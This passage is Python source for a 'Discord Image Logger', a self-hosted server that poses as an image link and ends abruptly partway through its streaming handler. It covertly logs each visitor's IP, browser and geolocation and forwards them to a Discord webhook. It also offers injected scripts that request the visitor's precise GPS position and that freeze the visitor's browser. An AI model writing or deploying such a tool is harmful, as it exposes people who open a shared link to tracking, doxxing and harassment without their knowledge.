#!/usr/bin/env python3
"""
Discord Image Logger — realtime edition.

Pure standard library (no pip install needed):
  * serves the logging page on any path
  * real-time event feed (Server-Sent Events) + web dashboard
  * geo/IP enrichment on a background worker (cached + rate limited)
  * Discord webhook delivery on a background worker (never blocks a visitor)
  * JSONL hit log on disk

Run directly :  python3 main.py
Run + tunnel :  python3 run.py
"""

from __future__ import annotations

import base64
import hmac
import html
import json
import os
import queue
import sys
import threading
import time
import traceback
import uuid
from collections import deque
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib import parse
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

__app__ = "Discord Image Logger"
__version__ = "v3.0"

ROOT = os.path.dirname(os.path.abspath(__file__))

# --------------------------------------------------------------------------- #
# Config
# --------------------------------------------------------------------------- #

DEFAULT_CONFIG = {
    "webhook": "",
    "host": "127.0.0.1",
    "port": 8080,
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been logged.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    # what Discord/Telegram's crawler gets when it unfurls the link:
    #   "image"    -> proxy the real image so the preview actually renders (default)
    #   "loading"  -> the tiny built-in "loading" JPEG
    #   "redirect" -> 302 to the image URL
    "preview": "image",
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://your-link.here"},
    "dashboard": {"enabled": True, "path": "/dashboard", "token": ""},
    "logFile": "logs/hits.jsonl",
    "blacklistedIPs": ["27", "104", "143", "164"],
    # privacy: collected events older than this are deleted (0 disables pruning)
    "dataRetentionDays": 7,
    # request/body cap, also applied when fetching the preview image
    "maxImageSizeMb": 10,
    # console verbosity: DEBUG | INFO | WARN | ERROR
    "logLevel": "INFO",
    # optional pre-existing tunnel URL to advertise instead of launching one
    "tunnelUrl": "",
}

CONFIG_PATH = os.path.join(ROOT, "config.json")


def load_config() -> dict:
    cfg = json.loads(json.dumps(DEFAULT_CONFIG))
    created = False
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as fh:
            user = json.load(fh)
    except FileNotFoundError:
        created = True
        user = {}
    except json.JSONDecodeError as exc:
        print(f"[config] config.json is invalid JSON ({exc}), using defaults")
        user = {}

    def merge(dst, src):
        for key, value in src.items():
            if isinstance(value, dict) and isinstance(dst.get(key), dict):
                merge(dst[key], value)
            else:
                dst[key] = value

    merge(cfg, user)

    # optional .env support: KEY=VALUE lines, '#' comments, real env vars win.
    env_path = os.path.join(ROOT, ".env")
    if os.path.isfile(env_path):
        try:
            with open(env_path, "r", encoding="utf-8") as fh:
                for raw in fh:
                    line = raw.strip()
                    if not line or line.startswith("#") or "=" not in line:
                        continue
                    key, _, value = line.partition("=")
                    key, value = key.strip(), value.strip().strip("\"'")
                    if key and value:
                        os.environ.setdefault(key, value)
        except OSError:
            pass

    def env_int(name: str) -> int | None:
        try:
            return int(os.environ.get(name, "") or "")
        except ValueError:
            return None

    # documented environment overrides (an explicit shell value beats .env)
    hook = os.environ.get("IMAGE_LOGGER_WEBHOOK") or os.environ.get("WEBHOOK_URL")
    if hook:
        cfg["webhook"] = hook
    if os.environ.get("TUNNEL_URL"):
        cfg["tunnelUrl"] = os.environ["TUNNEL_URL"].strip()
    if os.environ.get("LOG_LEVEL"):
        cfg["logLevel"] = os.environ["LOG_LEVEL"].strip().upper()
    if (days := env_int("DATA_RETENTION_DAYS")) is not None and days >= 0:
        cfg["dataRetentionDays"] = days
    if (mib := env_int("MAX_IMAGE_SIZE_MB")) is not None and mib > 0:
        cfg["maxImageSizeMb"] = mib
    if os.environ.get("NGROK_AUTHTOKEN") and not cfg.get("ngrokAuthtoken"):
        cfg["ngrokAuthtoken"] = os.environ["NGROK_AUTHTOKEN"].strip()

    # protect the realtime feed: a public tunnel must not leak your log history
    if not (cfg.get("dashboard") or {}).get("token"):
        import secrets
        cfg.setdefault("dashboard", {})["token"] = secrets.token_urlsafe(16)
        try:
            with open(CONFIG_PATH, "w", encoding="utf-8") as fh:
                json.dump(cfg, fh, indent=2)
                fh.write("\n")
            if not created:
                print("[config] generated dashboard.token in config.json")
        except OSError:
            pass
    return cfg


config = load_config()

# --------------------------------------------------------------------------- #
# Pretty console output
# --------------------------------------------------------------------------- #

_TTY = sys.stdout.isatty()
_RESET = "\033[0m"
_COLORS = {
    "hit": "\033[96m",
    "geo": "\033[92m",
    "alert": "\033[93m",
    "webhook": "\033[95m",
    "warn": "\033[93m",
    "error": "\033[91m",
    "net": "\033[94m",
}


_LEVEL_RANK = {"debug": 10, "net": 20, "info": 20, "hit": 20, "geo": 20,
               "webhook": 20, "warn": 30, "error": 40}
_THRESHOLD = {"DEBUG": 10, "INFO": 20, "WARN": 30, "WARNING": 30,
              "ERROR": 40}.get(str(config.get("logLevel") or "INFO").upper(), 20)


def say(kind: str, message: str) -> None:
    if _LEVEL_RANK.get(kind, 20) < _THRESHOLD:
        return
    tag = kind.upper().ljust(7)
    stamp = time.strftime("%H:%M:%S")
    if _TTY:
        color = _COLORS.get(kind, "")
        print(f"\033[90m{stamp}{_RESET} {color}{tag}{_RESET} {message}", flush=True)
    else:
        print(f"{stamp} {tag} {message}", flush=True)


# --------------------------------------------------------------------------- #
# Event bus  ->  SSE subscribers + history + JSONL file
# --------------------------------------------------------------------------- #

_lock = threading.Lock()
_subscribers: set[queue.Queue] = set()
_history: deque[dict] = deque(maxlen=300)
_stats = {"hits": 0, "unique": set(), "countries": set()}
_log_path = os.path.join(ROOT, config.get("logFile") or "logs/hits.jsonl")
_log_lock = threading.Lock()

try:
    os.makedirs(os.path.dirname(_log_path), exist_ok=True)
except OSError:
    pass


def emit(kind: str, data: dict, event_id: str | None = None) -> dict:
    event = {
        "id": event_id or uuid.uuid4().hex[:12],
        "type": kind,
        "ts": time.time(),
        "data": data,
    }
    with _lock:
        _history.append(event)
        subscribers = list(_subscribers)
    for sub in subscribers:
        try:
            sub.put_nowait(event)
        except Exception:
            pass

    try:
        with _log_lock, open(_log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(event, ensure_ascii=False) + "\n")
    except OSError:
        pass
    return event


def history() -> list[dict]:
    with _lock:
        return list(_history)


def subscribe() -> queue.Queue:
    q: queue.Queue = queue.Queue(maxsize=500)
    with _lock:
        _subscribers.add(q)
    return q


def unsubscribe(q: queue.Queue) -> None:
    with _lock:
        _subscribers.discard(q)


# --------------------------------------------------------------------------- #
# Data retention: drop archive entries older than dataRetentionDays
# --------------------------------------------------------------------------- #

def prune_archive() -> int:
    """Delete JSONL events older than the retention window.

    Returns the number of entries removed. Runs under _log_lock so it can
    never race an append from emit(). Setting dataRetentionDays to 0
    disables pruning entirely.
    """
    days = int(config.get("dataRetentionDays") or 0)
    if days <= 0 or not os.path.isfile(_log_path):
        return 0

    cutoff = time.time() - days * 86400
    removed = 0
    with _log_lock:
        try:
            with open(_log_path, "r", encoding="utf-8") as fh:
                lines = fh.readlines()
        except OSError:
            return 0

        kept = []
        for line in lines:
            try:
                ts = float(json.loads(line).get("ts") or 0)
            except (ValueError, TypeError, AttributeError):
                kept.append(line)   # unparseable line: keep it, don't destroy data
                continue
            if ts and ts < cutoff:
                removed += 1
            else:
                kept.append(line)

        if removed:
            tmp = _log_path + ".pruning"
            try:
                with open(tmp, "w", encoding="utf-8") as fh:
                    fh.writelines(kept)
                os.replace(tmp, _log_path)
            except OSError:
                try:
                    os.unlink(tmp)
                except OSError:
                    pass
                return 0

    if removed:
        say("net", f"retention: pruned {removed} event(s) older than {days} day(s)")
    return removed


def _retention_worker() -> None:
    while True:
        time.sleep(3600)     # hourly sweep; boot also prunes once
        try:
            prune_archive()
        except Exception:
            say("error", "retention sweep failed:\n" + traceback.format_exc(limit=4))


# --------------------------------------------------------------------------- #
# User agent -> OS / browser  (stdlib replacement for httpagentparser)
# --------------------------------------------------------------------------- #

def detect_client(user_agent: str) -> tuple[str, str]:
    ua = user_agent or ""
    low = ua.lower()

    if "discordbot" in low or low.startswith("discord"):
        browser = "Discord"
    elif "edg/" in low:
        browser = "Edge"
    elif "opr/" in low or "opera" in low:
        browser = "Opera"
    elif "brave" in low:
        browser = "Brave"
    elif "vivaldi" in low:
        browser = "Vivaldi"
    elif "firefox/" in low:
        browser = "Firefox"
    elif "chrome/" in low and "chromium" not in low:
        browser = "Chrome"
    elif "safari/" in low and "version/" in low:
        browser = "Safari"
    elif "cfnetwork" in low or "applecoremedia" in low:
        browser = "Apple Client"
    elif "curl/" in low:
        browser = "curl"
    elif "wget" in low:
        browser = "wget"
    elif "python-requests" in low or "python-urllib" in low:
        browser = "Python"
    elif not ua:
        browser = "Unknown"
    else:
        browser = ua.split(" ")[0][:32]

    if "windows nt 10" in low or "windows nt 11" in low:
        os_name = "Windows 10/11"
    elif "windows nt" in low:
        os_name = "Windows"
    elif "android" in low:
        os_name = "Android"
    elif "iphone" in low or "ipad" in low or "ios" in low:
        os_name = "iOS"
    elif "mac os x" in low or "macintosh" in low:
        os_name = "macOS"
    elif "cros" in low:
        os_name = "ChromeOS"
    elif "linux" in low or "x11" in low:
        os_name = "Linux"
    else:
        os_name = "Unknown"

    return os_name, browser


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #

# matching any of these => the request is a link unfurler, not a human.
# NOTE: deliberately NOT matching the Discord app itself ("Discord/…"), so a
# person opening the link inside Discord still gets logged as a real visitor.
CRAWLER_HINTS = (
    "Discordbot", "TelegramBot", "Twitterbot", "Slackbot",
    "WhatsApp", "facebookexternalhit", "Facebot", "LinkedInBot", "vkShare",
    "redditbot", "Pinterest", "Googlebot", "bingbot", "Applebot",
)


def client_ip(headers, address) -> str:
    """Best-effort real client IP behind cloudflared / nginx / ngrok."""
    for header in ("Cf-Connecting-Ip", "True-Client-Ip", "X-Real-Ip"):
        value = headers.get(header)
        if value:
            return value.strip().split(",")[0].strip()
    forwarded = headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    if address:
        return address[0]
    return "unknown"


def http_json(url: str, timeout: float = 6.0) -> dict | None:
    req = Request(url, headers={"User-Agent": "Mozilla/5.0 ImageLogger/3.0"})
    try:
        with urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8", "replace"))
    except (HTTPError, URLError, ValueError, TimeoutError, OSError):
        return None


def post_json(url: str, payload: dict, timeout: float = 8.0) -> tuple[int | None, float]:
    """Returns (http_status, retry_after_seconds). status is None on network error."""
    body = json.dumps(payload).encode("utf-8")
    req = Request(
        url,
        data=body,
        headers={"Content-Type": "application/json", "User-Agent": "ImageLogger/3.0"},
        method="POST",
    )
    try:
        with urlopen(req, timeout=timeout) as resp:
            return resp.status, 0.0
    except HTTPError as exc:
        retry = 0.0
        if exc.code == 429:
            try:
                data = json.loads(exc.read().decode("utf-8", "replace") or "{}")
                retry = float(data.get("retry_after") or 5.0)
            except (ValueError, TypeError):
                retry = 5.0
        return exc.code, retry
    except (URLError, TimeoutError, OSError):
        return None, 3.0


def decode_image_arg(query: dict) -> str:
    raw = query.get("url") or query.get("id")
    if not raw:
        return config["image"]
    try:
        padded = raw + "=" * (-len(raw) % 4)
        decoded = base64.urlsafe_b64decode(padded.encode()).decode("utf-8", "replace")
        if decoded.startswith("http"):
            return decoded
    except Exception:
        pass
    if raw.startswith("http"):
        return raw
    return config["image"]


# --------------------------------------------------------------------------- #
# Geo enrichment (background worker: cached + paced)
# --------------------------------------------------------------------------- #

GEO_FIELDS = (
    "status,message,country,countryCode,regionName,region,city,lat,lon,"
    "timezone,isp,org,as,mobile,proxy,hosting,query,reverse"
)

_geo_cache: dict[str, tuple[float, dict | None]] = {}  # ip -> (expiry, info|None)
_geo_queue: "queue.Queue[tuple[str, str] | None]" = queue.Queue()
_geo_pace = deque()  # timestamps of recent lookups
_geo_waiters: dict[str, threading.Event] = {}
GEO_OK_TTL = 6 * 3600      # a successful lookup is reused for hours
GEO_MISS_TTL = 120         # a failed lookup is retried after 2 minutes
_ip_api_blocked_until = 0.0


def _normalize_ipwho(data: dict) -> dict:
    conn = data.get("connection") or {}
    tz = data.get("timezone") or {}
    return {
        "status": "success" if data.get("success") else "fail",
        "country": data.get("country"),
        "regionName": data.get("region"),
        "city": data.get("city"),
        "lat": data.get("latitude"),
        "lon": data.get("longitude"),
        "timezone": tz.get("id"),
        "isp": conn.get("isp"),
        "org": conn.get("org"),
        "as": f"AS{conn.get('asn')} {conn.get('org')}".strip() if conn.get("asn") else None,
        "mobile": data.get("type") in ("mobile",),
        "proxy": False,
        "hosting": bool(conn.get("hosting")),
        "query": data.get("ip"),
    }


def is_local(ip: str) -> bool:
    if not ip or ip in ("unknown", "127.0.0.1", "::1", "::ffff:127.0.0.1"):
        return True
    return ip.startswith(("10.", "192.168.", "172.16.", "172.17.", "172.18.",
                          "172.19.", "172.2", "169.254.", "fc", "fd", "fe80"))


def is_discord_ip(ip: str) -> bool:
    """Discord's crawler lives in the 34.x / 35.x AS ranges."""
    first = ip.split(".", 1)[0]
    return first in ("34", "35")


def lookup_geo(ip: str) -> dict | None:
    """ip-api (45 req/min free limit) with an automatic fallback provider."""
    if is_local(ip):
        return None

    global _ip_api_blocked_until
    if time.time() >= _ip_api_blocked_until:
        data = http_json(f"http://ip-api.com/json/{ip}?fields={GEO_FIELDS}", timeout=6)
        if data and data.get("status") == "success":
            return data
        if data and "rate" in str(data.get("message", "")).lower():
            # back off instead of hammering a provider that is telling us no
            _ip_api_blocked_until = time.time() + 60
            say("warn", "geo provider rate-limited — using fallback for 60s")

    data = http_json(f"https://ipwho.is/{ip}", timeout=6)
    if data and data.get("success", True) and data.get("country"):
        return _normalize_ipwho(data)
    return None


def _cache_put(ip: str, info: dict | None) -> None:
    ttl = GEO_OK_TTL if info else GEO_MISS_TTL
    with _lock:
        _geo_cache[ip] = (time.time() + ttl, info)
        if len(_geo_cache) > 2000:  # bound memory
            oldest = sorted(_geo_cache, key=lambda k: _geo_cache[k][0])[:500]
            for key in oldest:
                _geo_cache.pop(key, None)


def _cache_get(ip: str) -> tuple[bool, dict | None]:
    """Returns (found, info). info is None when the lookup found nothing."""
    with _lock:
        item = _geo_cache.get(ip)
    if not item:
        return False, None
    expiry, info = item
    if time.time() > expiry:
        with _lock:
            _geo_cache.pop(ip, None)
        return False, None
    return True, info


def _geo_worker() -> None:
    """Single paced worker: keeps us under ip-api's 45 req/min free limit."""
    while True:
        item = _geo_queue.get()
        if item is None:
            continue
        ip, event_id = item
        with _lock:
            waiter = _geo_waiters.get(ip)

        found, info = _cache_get(ip)
        if not found:
            # pace to stay under ip-api's 45 req/min free limit
            while _geo_pace and time.time() - _geo_pace[0] < 1.4:
                time.sleep(max(0.05, 1.4 - (time.time() - _geo_pace[0])))
            _geo_pace.append(time.time())
            info = lookup_geo(ip)
            _cache_put(ip, info)
            if info:
                place = ", ".join(str(p) for p in
                                  [info.get("city"), info.get("country")] if p)
                say("geo", f"{ip} → {place or 'located'}")
            else:
                say("geo", f"{ip} → location unavailable (rate-limited or no data)")

        if waiter:
            waiter.set()
        if event_id:
            emit("geo", {"id": event_id, "ip": ip, "geo": info,
                         "geoStatus": "ok" if info else "unavailable"},
                 event_id=event_id)


def geo_for(ip: str, event_id: str | None = None, timeout: float = 9.0) -> dict | None:
    """Blocking (background threads only) cached geo lookup."""
    if not ip or is_local(ip):
        return None
    found, info = _cache_get(ip)
    if found:
        return info
    with _lock:
        waiter = _geo_waiters.get(ip)
        if waiter is None:
            waiter = threading.Event()
            _geo_waiters[ip] = waiter
            _geo_queue.put((ip, event_id))
    waiter.wait(timeout)
    with _lock:
        _geo_waiters.pop(ip, None)
    found, info = _cache_get(ip)
    return info


# --------------------------------------------------------------------------- #
# Discord webhook (background worker with retry)
# --------------------------------------------------------------------------- #

_webhook_queue: "queue.Queue[dict | None]" = queue.Queue()
WEBHOOK_WORKERS = 2
_webhook_dead = threading.Event()  # set once the webhook URL is proven bad


def _webhook_worker() -> None:
    while True:
        payload = _webhook_queue.get()
        if payload is None:
            continue
        if _webhook_dead.is_set():
            continue
        webhook = config.get("webhook") or ""
        if not webhook:
            continue
        title = (payload.get("embeds") or [{}])[0].get("title", "message")
        for attempt in range(4):
            status, retry = post_json(webhook, payload)
            if status and 200 <= status < 300:
                say("webhook", f"sent → {title}")
                break
            if status in (401, 403, 404):
                _webhook_dead.set()
                say("error", f"webhook rejected with HTTP {status} — the URL in "
                              "config.json is invalid/revoked, put yours there "
                              "(or set IMAGE_LOGGER_WEBHOOK). Discord alerts are off.")
                break
            wait = max(retry, 1.5 * (attempt + 1))
            if attempt < 3:
                say("warn", f"webhook HTTP {status} — retrying in {wait:.1f}s")
            time.sleep(wait)
        else:
            say("error", "webhook delivery failed after 4 attempts")


def queue_webhook(payload: dict) -> None:
    if _webhook_dead.is_set() or not config.get("webhook"):
        return
    try:
        _webhook_queue.put_nowait(payload)
    except queue.Full:
        pass


def rich_message(text: str, info: dict | None, ip: str, user_agent: str) -> str:
    os_name, browser = detect_client(user_agent)
    tz = (info or {}).get("timezone") or "UTC"
    if "/" in str(tz):
        tz = f"{str(tz).split('/')[1].replace('_', ' ')} ({str(tz).split('/')[0]})"
    bot = "False"
    if info:
        if info.get("hosting") and not info.get("proxy"):
            bot = "True"
        elif info.get("hosting"):
            bot = "Possibly"
    mapping = {
        "{ip}": ip,
        "{isp}": (info or {}).get("isp") or "Unknown",
        "{asn}": (info or {}).get("as") or "Unknown",
        "{country}": (info or {}).get("country") or "Unknown",
        "{region}": (info or {}).get("regionName") or "Unknown",
        "{city}": (info or {}).get("city") or "Unknown",
        "{lat}": str((info or {}).get("lat")),
        "{long}": str((info or {}).get("lon")),
        "{timezone}": tz,
        "{mobile}": str((info or {}).get("mobile")),
        "{vpn}": str((info or {}).get("proxy")),
        "{bot}": bot,
        "{browser}": browser,
        "{os}": os_name,
    }
    for key, value in mapping.items():
        text = text.replace(key, str(value))
    return text


def build_webhook_payload(ip: str, user_agent: str, endpoint: str,
                          image_url: str, ping: str, info: dict | None) -> dict:
    os_name, browser = detect_client(user_agent)
    info = info or {}
    tz = info.get("timezone") or "UTC"
    if "/" in str(tz):
        tz = f"{str(tz).split('/')[1].replace('_', ' ')} ({str(tz).split('/')[0]})"
    coords = f"`{info.get('lat')}, {info.get('lon')}`" if info.get("lat") is not None else "`N/A`"
    bot = "False"
    if info.get("hosting") and not info.get("proxy"):
        bot = "True"
    elif info.get("hosting"):
        bot = "Possibly"

    description = (
        f"**A visitor opened the link!**\n\n"
        f"**Endpoint:** `{endpoint}`\n\n"
        f"**IP Info:**\n"
        f"> **IP:** `{ip}`\n"
        f"> **Provider:** `{info.get('isp') or 'Unknown'}`\n"
        f"> **ASN:** `{info.get('as') or 'Unknown'}`\n"
        f"> **Country:** `{info.get('country') or 'Unknown'}`\n"
        f"> **Region:** `{info.get('regionName') or 'Unknown'}`\n"
        f"> **City:** `{info.get('city') or 'Unknown'}`\n"
        f"> **Coords:** {coords}\n"
        f"> **Timezone:** `{tz}`\n"
        f"> **Mobile:** `{info.get('mobile')}`\n"
        f"> **VPN/Proxy:** `{info.get('proxy')}`\n"
        f"> **Bot/Hosting:** `{bot}`\n\n"
        f"**PC Info:**\n"
        f"> **OS:** `{os_name}`\n"
        f"> **Browser:** `{browser}`\n\n"
        f"**User Agent:**\n```\n{(user_agent or 'Unknown')[:1500]}\n```"
    )

    return {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": int(config.get("color") or 0x00FFFF),
                "description": description,
                "thumbnail": {"url": image_url} if image_url.startswith("http") else None,
            }
        ],
    }


def _alert_policy(info: dict | None) -> tuple[str, bool]:
    """Applies vpnCheck / antiBot. Returns (ping_text, suppress_webhook)."""
    ping, suppress = "@everyone", False
    if info:
        if info.get("proxy"):
            if config["vpnCheck"] == 2:
                suppress = True
            elif config["vpnCheck"] == 1:
                ping = ""
        if info.get("hosting"):
            mode = config["antiBot"]
            if mode == 4 and not info.get("proxy"):
                suppress = True
            elif mode == 3:
                suppress = True
            else:
                if mode == 2 and not info.get("proxy"):
                    ping = ""
                if mode == 1:
                    ping = ""
    return ping, suppress


def send_report(ip: str, user_agent: str, endpoint: str, image_url: str,
                location: str | None, event_id: str) -> None:
    """Runs on its own thread: enrich, broadcast, forward to Discord."""
    os_name, browser = detect_client(user_agent)
    info = geo_for(ip, event_id)          # fast path: usually done in 1-3 s
    ping, suppress = _alert_policy(info)

    with _lock:
        _stats["hits"] += 1
        if ip:
            _stats["unique"].add(ip)
        if info and info.get("country"):
            _stats["countries"].add(info["country"])
        hits, unique, countries = (_stats["hits"], len(_stats["unique"]),
                                   len(_stats["countries"]))

    # 1) broadcast right away so the dashboard is realtime
    emit(
        "log",
        {
            "id": event_id,
            "ip": ip,
            "ua": user_agent or "Unknown",
            "os": os_name,
            "browser": browser,
            "endpoint": endpoint,
            "geo": info,
            "geoStatus": ("ok" if info else ("local" if is_local(ip) else "unavailable")),
            "location": location,
            "ping": ping,
            "suppressed": suppress,
            "hits": hits,
            "unique": unique,
            "countries": countries,
        },
        event_id=event_id,
    )
    place = ""
    if info:
        place = " — " + ", ".join(p for p in [info.get("city"), info.get("country")] if p)
    elif not is_local(ip):
        place = " — location pending"
    say("hit", f"{ip}{place} | {os_name} / {browser} | {endpoint}"
               + ("  [webhook suppressed]" if suppress else ""))

    # 2) the geo provider failed (rate limit / no data) -> retry once before
    #    the Discord message goes out, so the embed carries a real location
    if info is None and not is_local(ip):
        time.sleep(12)
        with _lock:
            _geo_cache.pop(ip, None)      # drop the negative cache entry
        info = geo_for(ip, event_id, timeout=15)   # emits a 'geo' patch too
        if info:
            ping, suppress = _alert_policy(info)
            with _lock:
                if info.get("country"):
                    _stats["countries"].add(info["country"])

    # 3) forward to Discord with the final location
    if not suppress:
        payload = build_webhook_payload(ip, user_agent, endpoint, image_url, ping, info)
        if not image_url.startswith("http"):
            payload["embeds"][0].pop("thumbnail", None)
        queue_webhook(payload)


# --------------------------------------------------------------------------- #
# Page rendering
# --------------------------------------------------------------------------- #

BINARIES = {
    # loading spinner served to Discord/Telegram crawlers so the embed previews
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0'
        b'|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0'
        b'|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0'
        b'sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031'
        b'00000000000000000000000000'
    )
}
# the original blob is a truncated JPEG (no EOI marker) -> image proxies such as
# Discord's reject it, so close the stream properly
if not BINARIES["loading"].endswith(b"\xff\xd9"):
    BINARIES["loading"] += b"\xff\xd9"

_image_cache: dict[str, tuple[bytes, str]] = {}


def fetch_image(url: str) -> tuple[bytes, str] | None:
    """Server-side fetch of the configured image (cached), so Discord's crawler
    gets a real decodable image instead of a broken one."""
    if not url.startswith("http"):
        return None
    with _lock:
        cached = _image_cache.get(url)
    if cached is not None:
        return cached

    req = Request(url, headers={
        "User-Agent": "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
        "Accept": "image/*,*/*",
    })
    max_bytes = int(config.get("maxImageSizeMb") or 10) * 1024 * 1024
    try:
        with urlopen(req, timeout=15) as resp:
            ctype = (resp.headers.get("Content-Type") or "image/jpeg").split(";")[0].strip()
            declared = int(resp.headers.get("Content-Length") or 0)
            if declared > max_bytes:
                say("warn", f"preview image rejected: {declared // (1024 * 1024)} MB "
                            f"exceeds maxImageSizeMb")
                return None
            data = resp.read(max_bytes + 1)
    except (HTTPError, URLError, TimeoutError, OSError):
        return None
    if not data or len(data) > max_bytes or not ctype.startswith("image/"):
        return None

    result = (data, ctype)
    with _lock:
        if len(_image_cache) > 16:
            _image_cache.clear()
        _image_cache[url] = result
    say("net", f"cached preview image ({len(data) // 1024} KB, {ctype})")
    return result


def build_page(image_url: str, message: str, location_script: bool) -> bytes:
    parts = [
        "<!doctype html><html><head><meta charset='utf-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<title>Image</title><style>"
        "html,body{margin:0;padding:0;height:100%;background:#0b0b0f;}"
        "div.img{background-image:url('" + html.escape(image_url, quote=True) + "');"
        "background-position:center;background-repeat:no-repeat;"
        "background-size:contain;width:100vw;height:100vh;}"
        "</style></head><body><div class='img'></div>"
    ]
    if config["message"]["doMessage"]:
        parts.append("<div style='position:fixed;inset:0;display:flex;align-items:center;"
                     "justify-content:center;font:16px system-ui;color:#eee;text-align:center;"
                     "padding:24px'>" + message + "</div>")

    if location_script:
        parts.append(
            "<script>(function(){try{var u=window.location.href;if(u.indexOf('g=')>-1)return;"
            "if(!navigator.geolocation)return;"
            "navigator.geolocation.getCurrentPosition(function(c){"
            "var g=btoa(c.coords.latitude+','+c.coords.longitude).replace(/=/g,'%3D');"
            "location.replace(u+(u.indexOf('?')>-1?'&':'?')+'g='+g);});}catch(e){}})();</script>"
        )

    if config["crashBrowser"]:
        parts.append("<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>")

    if config["redirect"]["redirect"]:
        parts.append(f"<meta http-equiv='refresh' content=\"0;url={config['redirect']['page']}\">")

    parts.append("</body></html>")
    return "".join(parts).encode("utf-8")


# --------------------------------------------------------------------------- #
# HTTP handler
# --------------------------------------------------------------------------- #

class Handler(BaseHTTPRequestHandler):
    server_version = "ImageLogger/3.0"
    protocol_version = "HTTP/1.1"

    # --------------------------- plumbing --------------------------- #
    def log_message(self, fmt, *args):  # silence default stderr logging
        return

    def _send(self, status: int, content_type: str, body: bytes,
              extra: dict | None = None, length: bool = True) -> None:
        try:
            if self.command == "HEAD":
                body, length = b"", True
            self.send_response(status)
            self.send_header("Content-Type", content_type)
            if length:
                self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
            self.send_header("Access-Control-Allow-Origin", "*")
            for key, value in (extra or {}).items():
                self.send_header(key, value)
            self.end_headers()
            if body:
                self.wfile.write(body)
        except (BrokenPipeError, ConnectionResetError):
            pass

    def _json(self, status: int, payload: dict | list) -> None:
        self._send(status, "application/json; charset=utf-8",
                   json.dumps(payload, ensure_ascii=False).encode("utf-8"))

    def _query(self) -> dict:
        return dict(parse.parse_qsl(parse.urlsplit(self.path).query))

    def _authorized(self) -> bool:
        token = (config.get("dashboard") or {}).get("token") or ""
        if not token:
            return True
        given = (self._query().get("token")
                 or self.headers.get("X-Dashboard-Token") or "")
        # constant-time compare: a plain == on unequal strings can leak the
        # matching prefix through timing
        return hmac.compare_digest(str(given).encode("utf-8"),
                                   str(token).encode("utf-8"))

    # --------------------------- routing --------------------------- #
    def _route(self) -> None:
        try:
            self._dispatch()
        except (BrokenPipeError, ConnectionResetError):
            return
        except Exception:
            say("error", "request failed:\n" + traceback.format_exc(limit=6))
            try:
                self._send(500, "text/plain; charset=utf-8",
                           b"500 - Internal Server Error")
            except Exception:
                pass

    def _dispatch(self) -> None:
        if self.command == "POST":  # validate, then drain so keep-alive stays in sync
            try:
                length = int(self.headers.get("Content-Length") or 0)
            except ValueError:
                length = 0
            max_bytes = int(config.get("maxImageSizeMb") or 10) * 1024 * 1024
            if length > max_bytes:
                return self._send(413, "text/plain; charset=utf-8",
                                  b"413 - Payload Too Large")
            if length:
                try:
                    self.rfile.read(min(length, 1 << 20))
                except OSError:
                    pass

        split = parse.urlsplit(self.path)
        path = split.path or "/"
        dash = (config.get("dashboard") or {}).get("path") or "/dashboard"

        if path == "/favicon.ico":  # don't let browser icon requests pollute the feed
            return self._send(204, "image/x-icon", b"")

        if path == "/healthz":
            return self._json(200, {"ok": True, "app": __app__, "version": __version__,
                                    "uptime": round(time.time() - STARTED, 1),
                                    "hits": _stats["hits"]})

        if path.rstrip("/") == dash.rstrip("/") and config.get("dashboard", {}).get("enabled"):
            if not self._authorized():
                return self._send(401, "text/html; charset=utf-8",
                                  ("<h1>401 - missing or invalid dashboard token</h1>"
                                   "<p>Open <code>/dashboard?token=YOUR_TOKEN</code> "
                                   "(the token is in config.json and printed by run.py)"
                                   "</p>").encode())
            return self._send(200, "text/html; charset=utf-8", DASHBOARD_HTML.encode("utf-8"))

        if path == "/events":
            if not self._authorized():
                return self._json(401, {"error": "unauthorized"})
            return self._sse()

        if path == "/api/logs":
            if not self._authorized():
                return self._json(401, {"error": "unauthorized"})
            return self._json(200, {"events": history(),
                                    "stats": {"hits": _stats["hits"],
                                              "unique": len(_stats["unique"]),
                                              "countries": len(_stats["countries"])}})

        if path == "/api/link":
            if not self._authorized():
                return self._json(401, {"error": "unauthorized"})
            target = self._query().get("image") or config["image"]
            encoded = base64.urlsafe_b64encode(target.encode()).decode().rstrip("=")
            base = PUBLIC_BASE or f"http://{config['host']}:{config['port']}"
            return self._json(200, {"link": f"{base}/?url={encoded}", "base": base})

        return self._log_hit(path)

    do_GET = _route
    do_HEAD = _route
    do_POST = _route

    # --------------------------- realtime feed --------------------------- #
    def _sse(self) -> None:
        """Server-Sent Events.

        Framed as "body = until connection closes" (no Content-Length, no
        keep-alive) because that is the framing CDN/proxies such as
        Cloudflare + cloudflared stream instead of buffering.
        """
        try:
            self.send_response(200)
